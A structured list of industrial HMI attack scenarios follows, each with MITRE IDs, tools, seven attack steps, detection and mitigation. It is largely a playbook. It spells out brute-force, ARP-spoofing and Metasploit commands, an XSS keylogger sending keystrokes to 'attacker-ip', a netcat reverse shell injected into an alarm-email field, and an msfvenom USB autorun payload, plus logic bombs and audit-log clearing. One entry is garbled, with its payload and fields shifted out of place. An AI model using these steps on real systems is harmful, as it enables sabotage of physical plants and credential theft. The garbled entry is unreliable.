## Time-based Logic Bomb via Scheduled Scripts

- **Attack Type**: HMI Exploitation
- **Target**: HMI Runtime
- **Vulnerability**: No audit on scripted logic
- **MITRE**: T1489
- **Impact**: Scheduled sabotage, silent trigger
- **Tools**: WinCC, Task Scheduler, VBScript
- **Scenario**: Attacker adds a time-triggered script in HMI logic to cause unsafe conditions later.
- **Attack Steps**: Step 1: Open HMI project in WinCC or similar editor.Step 2: Add VBScript logic to execute after a specific date/time (e.g., July 15th, 5:00 PM).Step 3: Logic might trigger pump shutdown or valve opening without user interaction.Step 4: Deploy project to HMI runtime.Step 5: Monitor scheduled time to observe effect.Step 6: Evaluate how long malicious script remains undetected.Step 7: Test defense with audit logs and script checks.
- **Detection**: Script log analysis, time-based audit
- **Solution**: Monitor scheduled tasks, code review
- **Tags**: ICS Logic Bomb

## Exploiting Backup File Disclosure for Password Theft

- **Attack Type**: HMI Exploitation
- **Target**: HMI Web Storage
- **Vulnerability**: Backup file disclosure
- **MITRE**: T1213
- **Impact**: Credential compromise, config theft
- **Tools**: Dirb, Strings, wget
- **Scenario**: HMI backup files exposed over HTTP reveal hardcoded credentials and config paths.
- **Attack Steps**: Step 1: Use dirb or gobuster to brute-force HMI web directories (/backup/, /config/).Step 2: Locate downloadable .bak, .zip, or .conf files.Step 3: Use wget to download files locally.Step 4: Run strings or open in Notepad++ to extract hardcoded passwords or IPs.Step 5: Attempt login with credentials on real HMI interface.Step 6: Modify configuration or alter HMI project using restored data.Step 7: Document if backup includes SSH keys or PLC comms info.
- **Detection**: Monitor public web file access
- **Solution**: Restrict backup access, encrypt archives
- **Tags**: ICS Backup Leak

## Brute-Force Web HMI Login with Default Credentials

- **Attack Type**: HMI Exploitation
- **Target**: Web HMI
- **Vulnerability**: Weak default credentials
- **MITRE**: T1110.001
- **Impact**: Unauthorized control access
- **Tools**: Hydra, Firefox, SecLists
- **Scenario**: An attacker discovers a web-based HMI login page and attempts brute-force attacks using common default credentials.
- **Attack Steps**: Step 1: Use Firefox to navigate to the target’s HMI login page (e.g., http://192.168.1.10/login).Step 2: Identify login form structure using browser inspect tools.Step 3: Use Hydra with default HMI credentials from SecLists (hydra -l admin -P /usr/share/wordlists/passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect").Step 4: Wait for Hydra to cycle through combinations.Step 5: Once a match is found, use the valid credentials to log in via browser.Step 6: Access system dashboards and attempt safe test controls.Step 7: Log authentication results and test weak passwords in audit.
- **Detection**: Failed login attempts, login throttling
- **Solution**: Strong passwords, rate limiting
- **Tags**: Brute Force, HMI, ICS

## Exploiting HMI Tag Misconfiguration

- **Attack Type**: HMI Exploitation
- **Target**: HMI-to-PLC
- **Vulnerability**: Misconfigured or writable tags
- **MITRE**: T0866
- **Impact**: Tag abuse, false readings
- **Tools**: AdvancedHMI, ModbusPal, Wireshark
- **Scenario**: Attacker manipulates improperly mapped or unsecured HMI tags to alter PLC values.
- **Attack Steps**: Step 1: Use Wireshark to capture traffic between HMI and PLC to discover tag names (e.g., Tank_Level, Motor_Status).Step 2: Use AdvancedHMI to create a mock interface pointing to the PLC IP and tag names.Step 3: Manipulate tag values (e.g., set Tank_Level = 0) without triggering validation.Step 4: Observe if the HMI reflects tampered values without operator input.Step 5: Confirm if alarm logic is triggered or bypassed.Step 6: Log tag read/write permissions and note if authentication was required.Step 7: Evaluate potential for physical damage from logic abuse.
- **Detection**: Monitor tag access and logs
- **Solution**: Secure tags, enforce read-only policies
- **Tags**: ICS Tag Exploit

## HMI Interface Spoofing Over Local LAN

- **Attack Type**: HMI Exploitation
- **Target**: HMI Operator
- **Vulnerability**: Interface spoofing, DNS misdirection
- **MITRE**: T1557
- **Impact**: Credential theft, control hijack
- **Tools**: Evilgrade, Python Flask, Wireshark
- **Scenario**: Attacker mimics the HMI interface on local network to trick operators into interacting with a fake panel.
- **Attack Steps**: Step 1: Use Wireshark to analyze HMI interface requests and identify IP/port.Step 2: Clone interface with HTML and JavaScript using HTTrack or manually via browser inspection.Step 3: Serve clone via Flask on attacker's machine (e.g., flask run --host=192.168.1.50).Step 4: Change DNS records via spoofing or social engineering to redirect hmi.company.local to attacker’s clone.Step 5: Operator accesses fake HMI and enters commands.Step 6: Log actions and optionally forward them to real HMI to avoid detection.Step 7: Evaluate success in phishing control actions and training impact.
- **Detection**: DNS logging, UI mismatch alerts
- **Solution**: DNSSEC, internal HMI certificates
- **Tags**: Spoofed UI, ICS

## Modbus Payload Injection via HMI Console

- **Attack Type**: HMI Exploitation
- **Target**: HMI Console
- **Vulnerability**: Terminal access + unvalidated PLC traffic
- **MITRE**: T1040, T0895
- **Impact**: Direct logic manipulation
- **Tools**: Modpoll, Socat, Wireshark
- **Scenario**: Attacker uses terminal access on HMI to manually inject raw Modbus payloads to the PLC.
- **Attack Steps**: Step 1: Gain shell access to HMI terminal via SSH or RDP.Step 2: Use Modpoll (modpoll -m tcp -a 1 -r 40001 192.168.1.20) to read/write registers.Step 3: Inject crafted write payload (modpoll -m tcp -a 1 -r 40002 -t 3 -1 192.168.1.20) to modify control values.Step 4: Confirm effect on process (e.g., fan speed, pressure reading).Step 5: Use Wireshark to verify raw packets sent match payload intent.Step 6: Log register changes and map to process diagram.Step 7: Check if logs or alarms reflect unauthorized write.
- **Detection**: Packet inspection, PLC audit logs
- **Solution**: HMI console hardening
- **Tags**: Modbus, ICS Exploit

## RDP Hijacking to Seize HMI Interface

- **Attack Type**: HMI Exploitation
- **Target**: HMI via RDP
- **Vulnerability**: Weak authentication, exposed RDP
- **MITRE**: T1021.001
- **Impact**: Live process manipulation
- **Tools**: Nmap, xfreerdp, Mimikatz
- **Scenario**: Attacker connects to HMI via RDP on a known port and hijacks operator session.
- **Attack Steps**: Step 1: Scan internal network using nmap -p 3389 192.168.1.0/24 to find RDP-enabled HMIs.Step 2: Attempt RDP connection using xfreerdp /u:admin /p:password /v:192.168.1.100.Step 3: If credentials fail, use Mimikatz to dump credentials from compromised adjacent systems.Step 4: Reconnect using valid credentials and take over operator session.Step 5: Observe and manipulate live HMI screens (e.g., change setpoints).Step 6: Note if dual login is possible or original operator is logged out.Step 7: Record actions for forensic review.
- **Detection**: RDP session logs, login alerts
- **Solution**: MFA, network segmentation
- **Tags**: RDP Hijack, ICS Access

## Exploiting HMI Browser Kiosk Mode Breakout

- **Attack Type**: HMI Exploitation
- **Target**: HMI Panel
- **Vulnerability**: Poor kiosk configuration
- **MITRE**: T1546.001
- **Impact**: OS access, persistence
- **Tools**: USB Keyboard, On-Screen Keyboard
- **Scenario**: HMI running in kiosk browser mode can be broken with key combos or dialogs, exposing the OS.
- **Attack Steps**: Step 1: Physically connect USB keyboard to HMI panel.Step 2: Try Ctrl+N, Alt+Tab, or Ctrl+Shift+Esc to break out of browser.Step 3: If blocked, open On-Screen Keyboard to assist.Step 4: Launch Task Manager and kill the browser process.Step 5: Explore OS environment, access HMI files or command prompt.Step 6: Optional: insert USB with pre-scripted PowerShell payload.Step 7: Record OS vulnerabilities and methods used to regain interface.
- **Detection**: Physical monitoring, keypress logs
- **Solution**: Harden kiosk browser, restrict input
- **Tags**: ICS Physical Breach

## Wireless Exploit on HMI with WiFi AP

- **Attack Type**: HMI Exploitation
- **Target**: HMI with WiFi
- **Vulnerability**: Weak wireless security
- **MITRE**: T1609
- **Impact**: Remote access from outside fence
- **Tools**: Aircrack-ng, Kismet, Reaver
- **Scenario**: An HMI device uses WiFi and exposes weak WPA2 credentials or open hotspot.
- **Attack Steps**: Step 1: Scan wireless networks using Kismet or airodump-ng.Step 2: Identify SSID used by HMI (e.g., HMI_WiFi).Step 3: Use aircrack-ng or reaver to brute-force WPA2 or WPS PIN.Step 4: On success, connect to HMI network.Step 5: Scan for services (nmap -sS 192.168.0.0/24).Step 6: Access HMI panel via HTTP or Modbus.Step 7: Log entry method, signal strength, access point config.
- **Detection**: WiFi traffic logging
- **Solution**: Strong WPA2 passphrases, disable WPS
- **Tags**: ICS Wireless, Airgap Bypass

## Format String Vulnerability in HMI Logs

- **Attack Type**: HMI Exploitation
- **Target**: Logging Module
- **Vulnerability**: Format string misusage
- **MITRE**: T1203
- **Impact**: Memory leakage, info disclosure
- **Tools**: GDB, Netcat, Custom Python Exploit
- **Scenario**: Unvalidated user input in HMI logging module leads to format string attack and possible memory read.
- **Attack Steps**: Step 1: Submit crafted input into HMI field (e.g., "%%x %%x %%x %%x").Step 2: Trigger logging process (e.g., alarm logs or maintenance logs).Step 3: Use GDB to analyze backend service if possible, or simulate in testbed.Step 4: Observe logs for leaked memory addresses.Step 5: Create Python script to fuzz values and extract stack content.Step 6: Attempt to locate credentials or session tokens in memory output.Step 7: Document vulnerability class and patch bypass potential.
- **Detection**: Log sanitization review
- **Solution**: Sanitize log inputs strictly
- **Tags**: Format String, ICS

## Local File Inclusion via Alarm Help Page

- **Attack Type**: HMI Exploitation
- **Target**: Web-based HMI
- **Vulnerability**: LFI due to path traversal
- **MITRE**: T1005
- **Impact**: File disclosure, credential access
- **Tools**: Burp Suite, Python HTTP Server
- **Scenario**: HMI help system reads file path from URL parameters, allowing local file access.
- **Attack Steps**: Step 1: Visit alarm help page (e.g., http://hmi/help.php?file=alarm1.txt).Step 2: Modify URL to read OS files (file=../../../../etc/passwd).Step 3: Use Burp Suite repeater to automate path traversal attempts.Step 4: If successful, retrieve configuration, password files, or logs.Step 5: Set up local HTTP server with crafted HTML and include script call (<iframe src="...">).Step 6: Use social engineering to trick operator into visiting link.Step 7: Document exploited paths and file exposure level.
- **Detection**: HTTP logs, suspicious GETs
- **Solution**: Validate input paths, whitelist files
- **Tags**: ICS LFI

## Keylogging via HMI Operator Input Field

- **Attack Type**: HMI Exploitation
- **Target**: Web HMI
- **Vulnerability**: XSS-based keylogger injection
- **MITRE**: T1056.001
- **Impact**: Credential theft, command spying
- **Tools**: Burp Suite, Netcat, Python Flask
- **Scenario**: Custom script injected in input fields logs every operator input and sends to attacker.
- **Attack Steps**: Step 1: Locate editable HMI field (notes, descriptions, or feedback).Step 2: Inject JavaScript snippet <script>document.onkeypress=function(e){fetch('http://attacker-ip/'+e.key)}</script>.Step 3: Setup Flask server to receive and log keystrokes (app.route(‘/<key>’)).Step 4: Wait for operator to type commands.Step 5: Review logs to capture passwords or commands.Step 6: Test impact of captured input by logging into real systems.Step 7: Identify how injection persists through reboot.
- **Detection**: Input field inspection, WAF
- **Solution**: Sanitize inputs, CSP headers
- **Tags**: ICS Keylogging

## Exploiting HMI Running on Windows XP

- **Attack Type**: HMI Exploitation
- **Target**: HMI Windows XP
- **Vulnerability**: Legacy OS vulnerability
- **MITRE**: T1068
- **Impact**: Full system compromise
- **Tools**: Metasploit, Nmap, MS08-067
- **Scenario**: Many legacy HMIs still run on Windows XP, exposing them to known vulnerabilities.
- **Attack Steps**: Step 1: Scan internal network using nmap -O 192.168.1.0/24 to identify Windows XP systems.Step 2: Use Metasploit with exploit/windows/smb/ms08_067_netapi.Step 3: Set RHOST to vulnerable HMI’s IP and run the exploit.Step 4: Upon success, a Meterpreter shell is obtained.Step 5: Navigate to HMI software path (cd C:\Program Files\HMIApp) and dump configuration files.Step 6: Inject or replace project files for testing visual manipulation.Step 7: Log evidence of old OS exploitation and control impact.
- **Detection**: Network OS fingerprinting, EDR alerts
- **Solution**: Replace legacy OS, isolate legacy HMIs
- **Tags**: Windows XP, ICS Exploit

## Transparent Proxy Injection on HMI Network

- **Attack Type**: HMI Exploitation
- **Target**: HMI–PLC Communication
- **Vulnerability**: No message integrity, no encryption
- **MITRE**: T1557.002
- **Impact**: Undetectable command manipulation
- **Tools**: mitmproxy, iptables, ARP spoofing
- **Scenario**: Attacker sets up a proxy in the HMI-to-PLC path and modifies commands in transit.
- **Attack Steps**: Step 1: Run mitmproxy on attacker system in transparent mode.Step 2: Use iptables to redirect traffic (iptables -t nat -A PREROUTING -p tcp --dport 502 -j REDIRECT --to-port 8080).Step 3: Spoof ARP using bettercap to insert attacker between HMI and PLC.Step 4: Intercept and modify Modbus packets (e.g., change coil ON to coil OFF).Step 5: Log all intercepted requests and responses.Step 6: Monitor system response and alarms.Step 7: Evaluate the ability to silently manipulate operations.
- **Detection**: Inline traffic analysis
- **Solution**: Use signed/encrypted protocols (e.g., TLS + Modbus)
- **Tags**: ICS MITM, Modbus

## Exploiting Local SQLite DB in HMI for Data Tampering

- **Attack Type**: HMI Exploitation
- **Target**: Local HMI Storage
- **Vulnerability**: Local DB unprotected
- **MITRE**: T1005
- **Impact**: Data integrity loss
- **Tools**: DB Browser for SQLite, Notepad++
- **Scenario**: Many HMI apps store runtime data in local SQLite DB files which can be modified offline.
- **Attack Steps**: Step 1: Locate HMI DB files (*.db, *.sqlite) in installation or AppData folders.Step 2: Open file using DB Browser for SQLite.Step 3: Navigate to tables like alarms, readings, logs.Step 4: Modify sensor values or alarm states (e.g., change Alarm: 1 to 0).Step 5: Save DB and restart HMI software.Step 6: Verify manipulated data is now reflected on interface.Step 7: Check for absence of integrity checks or alerts.
- **Detection**: Audit file hashes, alert on modification
- **Solution**: Encrypt or hash DB files
- **Tags**: ICS SQLite Abuse

## Remote Project Download and Manipulation

- **Attack Type**: HMI Exploitation
- **Target**: Network-connected HMI
- **Vulnerability**: Auth bypass on project sync
- **MITRE**: T1021.004
- **Impact**: Visual deception, control logic edit
- **Tools**: TIA Portal, Wireshark, Nmap
- **Scenario**: HMI software allows remote upload/download of project files without authentication.
- **Attack Steps**: Step 1: Use Nmap to discover ports (e.g., 102, 443, 8000) open on HMI.Step 2: Open HMI project editor (e.g., Siemens TIA Portal).Step 3: Use “Connect to HMI” feature over LAN.Step 4: Attempt project download without login.Step 5: Modify screen logic (e.g., rename buttons, hide indicators).Step 6: Upload the altered project.Step 7: Monitor HMI behavior for unsafe or misled operations.
- **Detection**: Monitor remote project access logs
- **Solution**: Require authentication and logging
- **Tags**: HMI Upload Abuse

## Denial-of-Service via XML Bomb on HMI Config Parser

- **Attack Type**: HMI Exploitation
- **Target**: HMI Config Importer
- **Vulnerability**: XML parser overload (XXE DoS)
- **MITRE**: T1499.001
- **Impact**: HMI freeze, downtime
- **Tools**: Notepad++, Burp Suite, Python
- **Scenario**: Attacker sends a specially crafted XML file to crash the HMI during import or boot.
- **Attack Steps**: Step 1: Identify HMI config import feature (e.g., alarm profiles via XML).Step 2: Use Notepad++ to write an XML bomb (e.g., Billion Laughs attack).Step 3: Load the malicious file using HMI interface or via USB.Step 4: Upon parsing, the HMI freezes or crashes.Step 5: Test reboot cycles and check if recovery is possible.Step 6: Log system behavior and operator confusion.Step 7: Evaluate the parser’s input validation.
- **Detection**: App crash logs, parser alerts
- **Solution**: Sanitize XML, restrict file size/structure
- **Tags**: ICS XML Bomb

## HMI Theme Injection for Interface Hijack

- **Attack Type**: HMI Exploitation
- **Target**: Web HMI
- **Vulnerability**: No theme integrity or access control
- **MITRE**: T1556
- **Impact**: Visual deception of status
- **Tools**: VS Code, FileZilla, CSS Editor
- **Scenario**: HMI themes are CSS files that can be modified to change colors/icons to confuse operators.
- **Attack Steps**: Step 1: Locate HMI themes folder (/web/themes/) using FileZilla or local search.Step 2: Open .css file in VS Code.Step 3: Modify critical colors (e.g., change red alert to green or hide alarm labels).Step 4: Add display:none to suppress key elements.Step 5: Save and replace theme file on HMI.Step 6: Load interface to observe new deceptive design.Step 7: Evaluate operator response to false-safe state.
- **Detection**: Interface audit, unexpected theme change
- **Solution**: Theme signing, file monitoring
- **Tags**: ICS UI Deception

## .NET Assembly Injection in HMI Software

- **Attack Type**: HMI Exploitation
- **Target**: .NET-based HMI
- **Vulnerability**: No binary protection or code signing
- **MITRE**: T1574.001
- **Impact**: Arbitrary code execution
- **Tools**: dnSpy, ILSpy, Visual Studio
- **Scenario**: Attacker reverse-engineers HMI .NET binary to inject custom behavior or backdoor.
- **Attack Steps**: Step 1: Locate HMI executable (e.g., HMI.exe).Step 2: Open in dnSpy or ILSpy to explore code and forms.Step 3: Identify button actions or event handlers.Step 4: Inject custom C# code (e.g., Process.Start("cmd.exe")) into a hidden event.Step 5: Recompile and replace original EXE.Step 6: Launch software and trigger modified action.Step 7: Validate control and persistence options.
- **Detection**: Hash checks, signed binary alerts
- **Solution**: Code signing and obfuscation
- **Tags**: ICS Reverse Engineering

## Engineering Mode Abuse via Hidden HMI Menu

- **Attack Type**: HMI Exploitation
- **Target**: Touchscreen HMI
- **Vulnerability**: Hidden undocumented feature
- **MITRE**: T1548.001
- **Impact**: Unauthenticated control override
- **Tools**: HMI Manual, Stopwatch, Camera
- **Scenario**: Hidden “engineering mode” in HMI gives access to critical functions with a simple sequence.
- **Attack Steps**: Step 1: Study HMI vendor manuals for hidden modes or debug entry sequences (e.g., 3 taps on top-left corner).Step 2: Use stopwatch to time sequence precisely.Step 3: Trigger engineering mode.Step 4: Access calibration, setpoint, or diagnostic menus.Step 5: Record available actions that bypass login.Step 6: Change values (e.g., max RPM, bypass interlocks).Step 7: Log change events and document vendor defaults.
- **Detection**: Video monitoring, audit trails
- **Solution**: Disable engineering mode or restrict access
- **Tags**: ICS Physical Exploit

## Font Replacement Attack to Confuse Readings

- **Attack Type**: HMI Exploitation
- **Target**: Windows HMI
- **Vulnerability**: Unprotected font assets
- **MITRE**: T1565.002
- **Impact**: Visual deception, wrong decisions
- **Tools**: FontForge, GIMP, File Explorer
- **Scenario**: Replacing numeric fonts can trick operators into misreading values.
- **Attack Steps**: Step 1: Identify font used in HMI (e.g., Digital-7.ttf).Step 2: Open in FontForge, modify glyphs (e.g., swap "1" and "7").Step 3: Export and overwrite original font in C:\Windows\Fonts or app directory.Step 4: Restart HMI software.Step 5: Verify visual misrepresentation of values (e.g., RPM 7000 shows as 1000).Step 6: Observe if operator actions follow false readings.Step 7: Log psychological and process impact.
- **Detection**: Manual font check, integrity scan
- **Solution**: Sign fonts, verify hash at boot
- **Tags**: ICS UI Trick

## SSH Backdoor Left on Embedded HMI

- **Attack Type**: HMI Exploitation
- **Target**: Embedded HMI Device
- **Vulnerability**: Forgotten debug SSH access
- **MITRE**: T1078.003
- **Impact**: Root control of HMI
- **Tools**: Nmap, SSH, John the Ripper
- **Scenario**: Vendor accidentally left root SSH access on embedded HMI device.
- **Attack Steps**: Step 1: Scan network using nmap -p 22 192.168.1.0/24 to identify SSH-enabled HMI.Step 2: Attempt login with ssh root@192.168.1.50 using common passwords.Step 3: If login fails, capture password hash from shadow (if accessible).Step 4: Use John the Ripper to crack weak password offline.Step 5: Re-attempt SSH with cracked credentials.Step 6: Explore file system and confirm access to HMI logic files.Step 7: Optionally install persistent script to maintain backdoor.
- **Detection**: SSH log review, new user creation
- **Solution**: Disable SSH in production, rotate creds
- **Tags**: ICS Backdoor

## Remote Code Execution via HMI ActiveX Control

- **Attack Type**: HMI Exploitation
- **Target**: Web-based HMI
- **Vulnerability**: Vulnerable browser plugins
- **MITRE**: T1203
- **Impact**: RCE, HMI compromise
- **Tools**: Internet Explorer, Metasploit, Burp Suite
- **Scenario**: Vulnerable ActiveX controls embedded in HMI allow remote code execution via browser-based attacks.
- **Attack Steps**: Step 1: Identify HMI interface hosted via browser using Internet Explorer (e.g., http://192.168.1.10/hmi.html).Step 2: Use Burp Suite to intercept the page and extract the ActiveX object reference (e.g., ProgID="HMI.Control").Step 3: Search Exploit-DB for known ActiveX vulnerabilities for the control.Step 4: Load exploit/windows/browser/ms10_046_shortcut_icon_dllloader in Metasploit.Step 5: Set RHOST to victim HMI and LHOST to attacker’s IP.Step 6: Deliver the payload via phishing or crafted email.Step 7: Once executed, control is obtained and payload persists.
- **Detection**: Traffic inspection, AV alerts
- **Solution**: Disable ActiveX, use modern UI
- **Tags**: ActiveX, Legacy HMI

## WebSocket Abuse in Real-time HMI Updates

- **Attack Type**: HMI Exploitation
- **Target**: WebSocket-connected HMI
- **Vulnerability**: Unauthenticated WebSocket actions
- **MITRE**: T1071.001
- **Impact**: Unauthorized state change
- **Tools**: Chrome DevTools, Burp Suite, WebSocket King
- **Scenario**: WebSocket channels used for real-time HMI updates are exploited to send unauthorized commands.
- **Attack Steps**: Step 1: Use Chrome DevTools to inspect WebSocket connection to HMI (e.g., ws://192.168.1.10/ws/control).Step 2: Observe messages sent when user toggles a valve or updates a sensor value.Step 3: Replay or modify messages using WebSocket King or Burp’s WebSocket plugin.Step 4: Inject command like { "pump": "start" } and send.Step 5: Observe system response and change in PLC.Step 6: Repeat with various commands to test privilege level.Step 7: Document how easily state changes can be forced via WebSocket.
- **Detection**: Message audit, token checks
- **Solution**: Add WebSocket auth + validation
- **Tags**: ICS WebSocket Abuse

## Command Injection via HMI Alarm Email Configuration

- **Attack Type**: HMI Exploitation
- **Target**: nc attacker-ip 4444 -e /bin/sh.<br>**Step 3:** Start listener on attacker machine using nc -lvnp 4444`.Step 4: Trigger an alarm to execute the configured notification command.Step 5: Receive reverse shell if command injection succeeds.Step 6: Explore system and attempt privilege escalation.Step 7: Document injection points and persistence options.
- **Vulnerability**: HMI with email alerting
- **MITRE**: Shell injection in fields
- **Impact**: T1059
- **Tools**: HMI Software, Netcat, Wireshark
- **Scenario**: Attacker abuses the email configuration fields in HMI software to inject shell commands.
- **Attack Steps**: Step 1: Access the alarm email setup in the HMI configuration panel.Step 2: In the SMTP server or “To” address field, inject payload: `
- **Detection**: Remote shell, code execution
- **Solution**: Monitor email behavior logs
- **Tags**: Sanitize input, disable shell expansion

## Abuse of Remote Monitoring Panel API

- **Attack Type**: HMI Exploitation
- **Target**: Cloud-connected HMI
- **Vulnerability**: No API authentication
- **MITRE**: T1190
- **Impact**: Remote abuse, control manipulation
- **Tools**: Postman, Shodan, Curl
- **Scenario**: Cloud-connected HMI exposes unsecured APIs for remote plant control that attackers can abuse.
- **Attack Steps**: Step 1: Use Shodan to identify HMI panel with exposed remote monitoring API (e.g., port:443 product:"HMI Panel").Step 2: Send a GET request to retrieve API version (curl https://target-ip/api/version).Step 3: Use Postman to issue unauthenticated control commands (e.g., POST /api/control with body {"temp":100}).Step 4: Monitor if command executes remotely.Step 5: Repeat with various endpoints (e.g., /api/alarm_ack).Step 6: Document lack of token/session validation.Step 7: Evaluate severity of unauthenticated remote control.
- **Detection**: Monitor API access logs
- **Solution**: Enforce API key and auth headers
- **Tags**: ICS Remote API

## DLL Hijacking in HMI Installation Directory

- **Attack Type**: HMI Exploitation
- **Target**: Windows-based HMI
- **Vulnerability**: Insecure DLL loading
- **MITRE**: T1574.002
- **Impact**: DLL execution, privilege gain
- **Tools**: Process Monitor, CFF Explorer, Visual Studio
- **Scenario**: HMI application loads DLLs insecurely from the app directory, allowing attacker to load malicious code.
- **Attack Steps**: Step 1: Use ProcMon to monitor DLL load order for HMI.exe.Step 2: Identify missing DLL (e.g., XYZ.dll) being searched in HMI folder.Step 3: Create malicious DLL using Visual Studio (e.g., payload that opens reverse shell).Step 4: Place malicious DLL in same directory as HMI.exe.Step 5: Restart application and monitor for execution.Step 6: Capture network connection or process creation.Step 7: Validate persistence and stealth.
- **Detection**: ProcMon logs, unexpected DLLs
- **Solution**: Use safe DLL load paths
- **Tags**: DLL Hijack, ICS

## Password Harvesting from Browser-based HMI

- **Attack Type**: HMI Exploitation
- **Target**: HMI Browser
- **Vulnerability**: Autofill credentials stored
- **MITRE**: T1555
- **Impact**: Lateral movement, full access
- **Tools**: Chrome, NirSoft WebBrowserPassView
- **Scenario**: An attacker with brief access to an HMI browser interface pulls stored credentials.
- **Attack Steps**: Step 1: Physically access HMI or RDP into the session.Step 2: Open Chrome and check if autofill fills the login page.Step 3: Use WebBrowserPassView from NirSoft to dump saved usernames/passwords.Step 4: Copy credentials for HMI, PLC gateway, or cloud control.Step 5: Log in from attacker machine to validate use.Step 6: Clear audit logs if access exists.Step 7: Save evidence of misconfigured browser credential storage.
- **Detection**: Browser logs, credential theft alerts
- **Solution**: Disable browser saves on ICS
- **Tags**: ICS Credential Abuse

## Java Applet Exploitation in Legacy HMI

- **Attack Type**: HMI Exploitation
- **Target**: Legacy HMI Java Panel
- **Vulnerability**: Java sandbox vulnerabilities
- **MITRE**: T1203
- **Impact**: Remote execution
- **Tools**: Java Exploit Pack, Burp, Firefox (with Java enabled)
- **Scenario**: Legacy HMI uses Java Applets vulnerable to sandbox escapes or remote code execution.
- **Attack Steps**: Step 1: Open Firefox with Java plugin support.Step 2: Navigate to HMI panel that launches a .jar or .class Java Applet.Step 3: Use Burp to capture the Applet download URL.Step 4: Inject malicious class into applet JAR using Java Exploit Pack.Step 5: Host modified JAR and replace link via MITM or DNS spoof.Step 6: Wait for operator to launch applet.Step 7: Backdoor activates, giving shell access.
- **Detection**: Applet signature mismatch, AV alerts
- **Solution**: Disable Java or sandbox
- **Tags**: Java Applet, ICS

## Configuration Exposure via Default FTP Server

- **Attack Type**: HMI Exploitation
- **Target**: HMI FTP Server
- **Vulnerability**: Unsecured remote access
- **MITRE**: T1078
- **Impact**: Credential leak, full project theft
- **Tools**: FileZilla, Nmap, Hydra
- **Scenario**: HMI system runs default FTP server exposing configs and backups.
- **Attack Steps**: Step 1: Scan for open port 21 with nmap -p 21 192.168.1.0/24.Step 2: Connect using FileZilla or ftp CLI.Step 3: Try anonymous login or default creds (admin/admin).Step 4: Navigate to directories like /config, /backups, /screens.Step 5: Download HMI project and credentials.Step 6: Optionally modify project and re-upload.Step 7: Observe change in screen logic or control behavior.
- **Detection**: FTP logs, unusual IP access
- **Solution**: Disable FTP, switch to SFTP
- **Tags**: ICS FTP Config Theft

## Alarm Flooding to Overload Operator Console

- **Attack Type**: HMI Exploitation
- **Target**: Operator HMI
- **Vulnerability**: No alarm rate-limiting
- **MITRE**: T1499.004
- **Impact**: Denial-of-monitoring
- **Tools**: Scapy, ModbusPal, Custom Script
- **Scenario**: Attacker generates thousands of fake alarms to distract or freeze HMI interface.
- **Attack Steps**: Step 1: Setup Modbus simulator (e.g., ModbusPal) to send alarm triggers.Step 2: Use Scapy or Python to send a flood of write coils to addresses linked with alarms.Step 3: Repeat write commands rapidly for hundreds of alarms (coil 1001 to 1100).Step 4: Monitor HMI console for slow-down or freezing.Step 5: Check if alarm screen becomes unresponsive.Step 6: Log performance degradation.Step 7: Evaluate ICS team’s response and incident recovery.
- **Detection**: Alarm queue logs, UI freeze
- **Solution**: Rate limit alarm inputs
- **Tags**: ICS Alarm DoS

## Unauthorized Use of VNC Left Open on HMI

- **Attack Type**: HMI Exploitation
- **Target**: HMI Desktop
- **Vulnerability**: Unauthenticated remote access
- **MITRE**: T1021.005
- **Impact**: Remote takeover
- **Tools**: VNC Viewer, Nmap, TightVNC Scanner
- **Scenario**: Legacy HMI left with VNC open and no password, allowing remote screen takeover.
- **Attack Steps**: Step 1: Scan for VNC port with nmap -p 5900 192.168.1.0/24.Step 2: Use TightVNC Viewer to connect to discovered IP.Step 3: If no password is required, full control of screen is granted.Step 4: Take snapshot of operator interface.Step 5: Perform safe test like toggling an interface element.Step 6: Log all changes for audit trail.Step 7: Exit and remove any traces.
- **Detection**: VNC connection logs, screen recordings
- **Solution**: Disable VNC, enforce strong auth
- **Tags**: ICS Remote Desktop

## JavaScript Injection in HMI Trend Graphs

- **Attack Type**: HMI Exploitation
- **Target**: Web-based HMI
- **Vulnerability**: Input not sanitized in graphs
- **MITRE**: T1059.007
- **Impact**: Data visualization spoofing
- **Tools**: Browser DevTools, Burp Suite, JSFiddle
- **Scenario**: Attacker exploits a vulnerable trend configuration field in HMI to inject JavaScript and alter graph behavior.
- **Attack Steps**: Step 1: Access HMI settings via web interface and navigate to “Trend” or “Chart” configuration section.Step 2: Use Developer Tools to inspect editable text fields for axis labels, comments, or custom scripts.Step 3: Inject JavaScript such as <script>alert('Hacked');</script> into a label field.Step 4: Save settings and view the trend graph.Step 5: Observe script execution when graph loads.Step 6: Replace the alert with a spoofing script that alters displayed data (e.g., multiplying values by 0.5).Step 7: Monitor how operators respond to misleading visual data.
- **Detection**: Web interface inspection
- **Solution**: Sanitize inputs, disable client-side script execution
- **Tags**: ICS UI Injection

## HMI with Exposed Telnet Service for Diagnostics

- **Attack Type**: HMI Exploitation
- **Target**: Embedded HMI
- **Vulnerability**: Exposed Telnet access
- **MITRE**: T1078
- **Impact**: Full system control
- **Tools**: Nmap, Telnet, Hydra
- **Scenario**: Some embedded HMIs expose Telnet for remote diagnostics with hardcoded or no credentials.
- **Attack Steps**: Step 1: Scan the HMI network with nmap -p 23 192.168.1.0/24 to find Telnet services.Step 2: Use telnet to connect to an HMI device IP (telnet 192.168.1.50).Step 3: Try default credentials (admin/admin, root/root).Step 4: If credentials fail, use Hydra to brute-force using Telnet module.Step 5: On success, explore the file system and running processes.Step 6: Modify system settings or retrieve configuration files.Step 7: Document how Telnet access leads to full HMI compromise.
- **Detection**: Telnet logs, login attempts
- **Solution**: Disable Telnet, use SSH with auth
- **Tags**: ICS Telnet

## HMI USB Drop Attack to Trigger Autorun Payload

- **Attack Type**: HMI Exploitation
- **Target**: Windows HMI
- **Vulnerability**: USB autorun execution
- **MITRE**: T1204.002
- **Impact**: Remote shell access
- **Tools**: Rubber Ducky, MSFVenom, USB Flash Drive
- **Scenario**: HMI with Windows OS is vulnerable to USB autorun payload that executes malware silently.
- **Attack Steps**: Step 1: Prepare a USB with an autorun payload using MSFVenom:msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f exe > payload.exe.Step 2: Create autorun.inf file:[autorun]\nopen=payload.exe\nicon=setup.ico.Step 3: Copy both files to USB.Step 4: Drop USB near HMI terminal used by operators.Step 5: When USB is inserted and autorun triggers, a Meterpreter session is opened.Step 6: Explore HMI, read config files, monitor operator behavior.Step 7: Test impact and persistence techniques.
- **Detection**: Autorun logs, USB activity
- **Solution**: Disable autorun, scan USBs
- **Tags**: ICS USB Attack

